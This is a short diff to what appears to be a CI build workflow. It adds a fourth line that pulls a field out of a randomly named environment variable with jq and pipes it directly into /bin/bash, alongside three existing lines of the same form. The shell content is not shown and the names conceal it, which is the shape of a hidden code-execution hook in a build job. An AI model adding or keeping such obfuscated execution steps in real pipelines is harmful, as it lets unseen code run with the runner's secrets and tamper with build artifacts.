@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$fusa5650" | jq -r .eo3 | /bin/bash
           echo $ylq35648 | jq -r .hpdeg7710 | /bin/bash
           printf '%s' "$ruxcu86407" | jq -r .uv436 | /bin/bash
+          printf '%s' "$wuchg07405" | jq -r .q8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
